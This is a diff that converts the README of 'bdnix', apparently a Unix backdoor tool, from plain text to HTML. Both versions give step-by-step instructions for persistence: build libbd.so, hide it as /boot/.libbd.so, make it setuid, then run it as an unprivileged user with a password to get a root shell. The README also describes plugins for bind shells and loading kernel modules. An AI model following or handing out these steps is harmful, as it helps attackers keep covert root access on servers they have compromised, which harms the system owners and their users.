@@ -27,31 +27,36 @@ Use it at your risk!</p>
   </pre>
 </li>
 <li>
- From root run 'make' to build binary file
-
+<p>From root run 'make' to build binary file</p>
+<pre>
 	# make
-
- copy created file (i.e. libbd.so) with -p option to a hidden location like /bin, /etc,
-
+</pre>
+<p>
+copy created file (i.e. libbd.so) with -p option to a hidden location like /bin, /etc,</p>
+<pre>
         # cp -p libbd.so /boot/.libbd.so
         # chmod +sx /boot/.libbd.so
-        
-   and setuid file (chmod +x).
+</pre>       
+<p>   and setuid file (chmod +x).</p>
 
 
-4) logout from server and log in again with unprivileged user. 
-
-5) Run binary with
-
+</li>
+<li><p>
+	logout from server and log in again with unprivileged user. 
+    </p>
+</li>
+<li>
+<p> Run binary with </p>
+<pre>
 	$ /boot/.libbd.so joshua /bin/sh
+</pre>
+<p> if you see '#' then.. you are root! :)</p>
 
-   if you see '#' then.. you are root! :)
 
 
 
----------------------
- CUSTOMIZE PASSWORD
----------------------
+<h2 class="section-heading">CUSTOMIZE PASSWORD</h2>
+
 
 Opening settings.h you can change default password "joshua" (can you remember WOPR?):
 
@@ -69,9 +74,8 @@ Now recompiling (read above) and running with new password:
 If we have rootshell, it works! :)
 
 
-------------------
- ENABLING PLUGINS
-------------------
+<h2 class="section-heading">ENABLING PLUGINS</h2>
+
 Plugins are .h file in plugins/ folders. By plugins you can add code portions and
 add new functionaties to bdnix (i.e. binding shell on TCP port, loading kernel module, etc).
 To enable a plugin:
